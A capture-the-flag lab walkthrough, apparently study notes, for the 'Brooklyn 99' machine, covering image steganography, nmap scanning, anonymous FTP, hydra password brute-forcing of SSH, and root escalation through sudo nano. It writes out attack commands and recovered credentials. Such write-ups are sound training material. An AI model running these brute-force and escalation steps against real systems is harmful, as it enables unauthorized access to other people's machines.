# Brooklyn 99

> Structured cybersecurity study notes converted from the source DOCX. Commands, indicators, answers, and investigation pivots are preserved for rapid reference.

## Step 1: Visit the WebPage

- web page based on the obvious television show
- comment in the page source: <!-- Have you ever heard of steganography? -->
- the image name is brooklyn99.jpg
## Step 2: Download and examine the photo

- **Command:** `wget http://10.10.179.229/brooklyn99.jpg`
- **Command:** `cp brooklyn99.jpg bkn.jpg: copy the original and work on the copy`
- "strings" didn't reveal anything
- exiftool didn't reveal anything
- file command showed the file was a jpg… so file / extension matched
- tried https://www.aperisolve.com/ and found a likely password: fluffydog12@ninenine
## Step 3: Basic NMAP

- **Command:** `nmap -Pn 10.10.1179.229`
- just to show what's open:
```text
21/tcp open ftp
22/tcp open ssh
80/tcp open http
```

## Step 4: Thorough NMAP

- **Command:** `nmap -Pn -sV -sC -A -oN vulns.txt 10.10.179.229 --script vuln`
- revealed lots of stuff but didn't seem to check if ftp was open to anonymous login
## Step 5: Attempt anonymous login via ftp

- worked
- found file: note_to_jake.txt
- download file with "get" command
- file contains three names: Jake, Amy, Holt
- appears to be no further information available
## Step 6: enumerate directories

- **Command:** `dirb http://10.10.179.229:80 /usr/share/wordlists/dirb/common.txt`
- nothing revealed
- may need to try again with a larger directory.
## Step 7: use hydra to log into either / both ftp and ssh

- put the usernames in a file
- example: 'hydra -l <username> -P <wordlist of passwords> <server ip or hostname> <service>'
- ftp command: hydra -L names.txt -p fluffydog12@ninenine 10.10.179.229 ftp
- no positive results
- ssh command: hydra -L names.txt -p fluffydog12@ninenine 10.10.179.229 ssh
- one positive result: holt:fluffydog12@ninenine
Step 7a: Try a bruteforce attack on ssh
- remove holt from the names.txt file and the other names that begin with capital letters
- hydra -L names.txt -P /usr/share/wordlists/rockyou.txt 10.10.179.229 ssh
- found jake:987654321
## Step 8: Login to SSH

- holt:fluffydog12@ninenine
- found "user.txt" and the flag
## Step 9: Find escalation point

- run command: "sudo -l"
- user "holt" seems able to run nano with sudo privileges
- GTFOBins has several options for nano
## Step 10: Try the "SUDO" nano option to elevate privileges

- https://gtfobins.github.io/gtfobins/nano/
- deceptive… once you execute the commands it creates a non-interactive shell but nothing on the screen change
- I just typed in ls -alh to see what happened and it gave a directory listiing
- type in "whoami" and it provide "root"
